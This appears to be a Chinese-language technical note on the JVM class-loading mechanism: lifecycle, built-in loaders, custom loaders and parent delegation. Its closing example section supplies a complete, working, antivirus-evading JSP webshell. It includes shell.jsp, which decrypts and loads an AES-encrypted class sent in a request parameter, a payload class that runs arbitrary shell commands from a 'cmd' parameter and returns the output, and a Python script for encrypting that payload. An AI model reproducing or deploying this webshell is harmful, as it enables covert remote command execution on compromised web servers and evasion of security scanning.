# 类加载机制

## 类生命周期

类从被加载到虚拟机内存中开始到卸载出内存为止，它的生命周期可以简单概括为7个阶段：加载，验证，准备，解析，初始化，使用，卸载

![image-20250814135735195](https://s2.loli.net/2025/08/14/JkA7lajw3xPG4uK.png)

* 加载

1. 通过全类名获取定义此类的二进制字节流
2. 将字节流所代表的静态存储结构转换为方法去运行时的数据结构
3. 在内存中生成一个代表类的Class对象，作为方法区数据的访问入口

获取类的途径有jar、zip、war、jsp、网络、动态代理运行时生成……

## 类加载器

类加载器是一个负责加载类的对象。每一个类都有一个加载他的类加载器，且符合双亲委派机制的规范，但是这个规范也可以在需要时通过重写方法打破

注意数组类不是通过类加载器创建的，而是JVM在需要的时候自动创建的。

一个非数组类的类加载阶段是可控性最强的阶段，我们可以控制获取字节流的方式、类加载的时机、修改字节码加入AOP增强类的功能，但是注意无法直接修改类的原始逻辑

简单来说，类加载器就是动态加载java类的字节码（.class文件）到JVM中，在内存中生成一个类的对象的过程，这个字节码可以来自.java程序的编译，也可以来自其他途径，比如从网络上远程加载。

什么叫动态加载呢？就是加载类时不是一次性全部加载完，而是在需要的时候才去看这个类加载过没有，如果加载了就直接返回该类，如果没有才会加载，相同二进制名称的类只会被加载一次。

* 类加载器分类

JVM内置了3种类加载器

启动类加载器（`BootstrapClassLoader`）：最顶层的类加载器，用C++实现的，主要用于加载JDK核心类库，`%JAVA_HOME%/lib`目录下的 `rt.jar`、`resources.jar`、`charsets.jar`等 jar 包和类）以及被 `-Xbootclasspath`参数指定的路径下的所有类。

>**`rt.jar`**：rt 代表“RunTime”，`rt.jar`是 Java 基础类库，包含 Java doc 里面看到的所有的类的类文件。也就是说，我们常用内置库 `java.xxx.*`都在里面，比如`java.util.*`、`java.io.*`、`java.nio.*`、`java.lang.*`、`java.sql.*`、`java.math.*`。

扩展类加载器（`ExtensionClassLoader`）：主要负责加载 `%JRE_HOME%/lib/ext` 目录下的 jar 包和类以及被 `java.ext.dirs` 系统变量所指定的路径下的所有类。

应用程序类加载器（`AppClassLoader`）：面向我们用户的加载器，负责加载当前应用 classpath 下的所有 jar 包和类。

除了这三种类加载器之外，用户还可以加入自定义的类加载器来进行拓展，以满足自己的特殊需求。就比如说，我们可以对 Java 类的字节码（ `.class` 文件）进行加密，加载时再利用自定义的类加载器对其解密。

![image-20250814155145077](https://s2.loli.net/2025/08/14/DWOd2Q5iPbI9gtc.png)

除了BootstrapClassLoader是JVM自身一部分之外，其他所有的类加载器都是JVM外部实现的，全部继承自ClassLoader抽象类。这样做的好处是用户可以自定义类加载器，以便让应用程序自己决定如何去获取所需的类。

## 自定义类加载器

如果我们想自己写一个类加载器怎么办呢？显然我们要继承ClassLoader抽象类，并且重写他的方法，实现我们自己的逻辑就行了。

ClassLoader抽象类有两个关键的方法：

loadClass：加载指定二进制名称的类，实现了双亲委派机制。如果想打破双亲委派机制，就重写该方法就行

findClass：根据类的二进制名称来查找类，默认实现是空方法。重写该方法就能自定义改变字节码的来源

## 双亲委派机制

`ClassLoader` 类使用委托模型来搜索类和资源。每个 `ClassLoader` 实例都有一个相关的父类加载器。需要查找类或资源时，`ClassLoader` 实例会在试图亲自查找类或资源之前，将搜索类或资源的任务委托给其父类加载器。
 虚拟机中被称为 "bootstrap class loader"的内置类加载器本身没有父类加载器，但是可以作为 `ClassLoader` 实例的父类加载器

双亲委派模型并不是一种强制性的约束，只是 JDK 官方推荐的一种方式。另外，类加载器之间的父子关系一般不是以继承的关系来实现的，而是通常使用组合关系来复用父加载器的代码。

* 双亲委派机制执行流程

```java
protected Class<?> loadClass(String name, boolean resolve)
    throws ClassNotFoundException
{
    synchronized (getClassLoadingLock(name)) {
        //首先，检查该类是否已经加载过
        Class c = findLoadedClass(name);
        if (c == null) {
            //如果 c 为 null，则说明该类没有被加载过
            long t0 = System.nanoTime();
            try {
                if (parent != null) {
                    //当父类的加载器不为空，则通过父类的loadClass来加载该类
                    c = parent.loadClass(name, false);
                } else {
                    //当父类的加载器为空，则调用启动类加载器来加载该类
                    c = findBootstrapClassOrNull(name);
                }
            } catch (ClassNotFoundException e) {
                //非空父类的类加载器无法找到相应的类，则抛出异常
            }

            if (c == null) {
                //当父类加载器无法加载时，则调用findClass方法来加载该类
                //用户可通过覆写该方法，来自定义类加载器
                long t1 = System.nanoTime();
                c = findClass(name);

                //用于统计类加载器相关的信息
                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);
                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);
                sun.misc.PerfCounter.getFindClasses().increment();
            }
        }
        if (resolve) {
            //对类进行link操作
            resolveClass(c);
        }
        return c;
    }
}
```

双亲委派模型是 Java 类加载机制的重要组成部分，它通过委派父加载器优先加载类的方式，实现了两个关键的安全目标：避免类的重复加载和防止核心 API 被篡改。

JVM 区分不同类的依据是类名加上加载该类的类加载器，即使类名相同，如果由不同的类加载器加载，也会被视为不同的类。 双亲委派模型确保核心类总是由 `BootstrapClassLoader` 加载，保证了核心类的唯一性

我们比较熟悉的 Tomcat 服务器为了能够优先加载 Web 应用目录下的类，然后再加载其他目录下的类，就自定义了类加载器 `WebAppClassLoader` 来打破双亲委托机制。这也是 Tomcat 下 Web 应用之间的类实现隔离的具体原理。

## 举例

利用类加载机制，实现字节码加密，恶意类加密，动态传入恶意类实现命令执行的免杀JSP木马

* shell.jsp

```jsp
<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*"%>
<%!
class Crypto {
    // 使用32字节密钥
    static SecretKeySpec key = new SecretKeySpec(
        "this_is_a_32bytes__1234567890abc".getBytes(), "AES"
    );
    
    static byte[] decrypt(byte[] encrypted) throws Exception {
        // 分离IV和密文
        byte[] iv = new byte[16];
        byte[] data = new byte[encrypted.length - 16];
        System.arraycopy(encrypted, 0, iv, 0, 16);
        System.arraycopy(encrypted, 16, data, 0, data.length);
        
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.DECRYPT_MODE, key, new IvParameterSpec(iv));
        return cipher.doFinal(data);
    }
}

class ShadowLoader extends ClassLoader {
    public Class<?> load(byte[] classBytes) throws Exception {
        return super.defineClass(null, classBytes, 0, classBytes.length);
    }
}
%>
<%
String param = "payload";
if(request.getParameter(param) != null) {
    try {
        byte[] encrypted = Base64.getDecoder().decode(
            request.getParameter(param).replaceAll(" ", "+")
        );
        byte[] classBytes = Crypto.decrypt(encrypted);
        
        Object result = new ShadowLoader()
            .load(classBytes)
            .newInstance()
            .equals(pageContext);
        
        if(result != null) {
            out.print(result.toString());
        }
    } catch(Exception e) {
        out.print("ERROR: " + e.getMessage());
    }
}
%>
```

* payload.java

```java
import javax.servlet.jsp.PageContext;
import java.io.*;

public class Ghost implements java.io.Serializable {
    public boolean equals(Object obj) {
        PageContext pc = (PageContext)obj;
        try {
            // 获取命令参数
            String cmd = pc.getRequest().getParameter("cmd");
            if(cmd == null) return false;
            
            // 执行命令并获取输出
            Process p = Runtime.getRuntime().exec(
                new String[]{"sh", "-c", cmd}
            );
            
            // 读取命令输出
            StringBuilder sb = new StringBuilder();
            BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream())
            );
            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line).append("\n");
            }
            
            // 回显结果
            pc.getResponse().getWriter().print(sb.toString());
        } catch(Exception e) {
            return false;
        }
        return true;
    }
}
```

* encry.py

```python
#!/usr/bin/env python3
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import sys
import os

# 32字节密钥
KEY = b"this_is_a_32bytes__1234567890abc"
MODE = AES.MODE_CBC

def encrypt_class(file_path):
    with open(file_path, 'rb') as f:
        class_bytes = f.read()
    
    # 生成随机IV
    iv = os.urandom(16)
    
    cipher = AES.new(KEY, MODE, iv=iv)
    encrypted = cipher.encrypt(pad(class_bytes, AES.block_size))
    
    # 返回IV+密文的Base64
    combined = iv + encrypted
    print("Full Payload:", base64.b64encode(combined).decode())

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <class_file>")
        sys.exit(1)
    
    encrypt_class(sys.argv[1])
```

